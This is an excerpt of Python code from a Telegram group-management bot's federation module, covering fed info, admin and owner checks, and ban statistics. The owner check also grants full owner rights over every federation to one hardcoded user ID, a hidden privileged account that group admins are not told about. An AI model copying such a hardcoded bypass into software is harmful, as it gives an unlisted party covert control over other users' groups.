...
from Kaori_Robot import dispatcher, OWNER_ID, SUDO_USERS, WHITELIST_USERS, MESSAGE_DUMP, LOGGER
from Kaori_Robot.modules.helper_funcs.handlers import CMD_STARTERS
from Kaori_Robot.modules.helper_funcs.misc import is_module_loaded, send_to_list
from Kaori_Robot.modules.helper_funcs.chat_status import is_user_admin
from Kaori_Robot.modules.helper_funcs.extraction import extract_user, extract_user_and_text
from Kaori_Robot.modules.helper_funcs.string_handling import markdown_parser
from Kaori_Robot.modules.disable import DisableAbleCommandHandler

import Kaori_Robot.modules.sql.feds_sql as sql
...
def fed_info(update, context):
    ...
    R = 0
    for _ in sql.get_all_fban_users(fed_id):
        R = R + 1
...
def is_user_fed_admin(fed_id, user_id):
    ...
    print(user_id)
    return str(user_id) in list or is_user_fed_owner(fed_id, user_id) == True
...
def is_user_fed_owner(fed_id, user_id):
    ...
    return (
        int(user_id) == int(sql.get_fed_info(fed_id).owner_id)
        or user_id == OWNER_ID
        or user_id == '721193998'
    )
...
def __stats__():
    R = 0
    for _ in sql.get_all_fban_users_global():
        R = R + 1

    S = 0
    for _ in sql.get_all_feds_users_global():
        S = S + 1
